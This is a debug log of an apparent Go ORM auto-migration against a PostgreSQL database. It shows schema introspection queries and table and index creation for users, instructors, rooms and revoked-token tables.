[0m[33m[3.835ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.591ms] [34;1m[rows:-][0m SELECT * FROM "revoked_tokens" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.975ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.466ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.513ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.204ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.229ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.249ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.282ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.899ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_tokens' AND indexname = 'idx_revoked_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.546ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_token_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.369ms] [34;1m[rows:0][0m CREATE TABLE "revoked_token_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"student_id" bigint,"revoked_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_token_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_revoked_token_students_revoked_token" FOREIGN KEY ("revoked_token_id") REFERENCES "revoked_tokens"("id"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.431ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_token_students_deleted_at" ON "revoked_token_students" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.178ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.154ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.778ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.040ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.863ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.510ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.063ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.285ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.724ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.313ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.286ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.191ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.272ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.444ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.034ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.057ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.079ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.174ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.035ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.989ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.394ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.862ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.897ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.275ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.457ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.464ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.501ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.265ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.194ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.098ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.001ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.003ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.854ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.011ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.956ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.665ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[29.167ms] [34;1m[rows:0][0m CREATE TABLE "rooms" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"title" text NOT NULL,"description" text NOT NULL,"room_verified" boolean NOT NULL,"locked" boolean NOT NULL,"instructor_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_rooms_instructor" FOREIGN KEY ("instructor_id") REFERENCES "instructors"("id"),CONSTRAINT "uni_rooms_title" UNIQUE ("title"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.288ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_rooms_deleted_at" ON "rooms" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.713ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.357ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.342ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.569ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
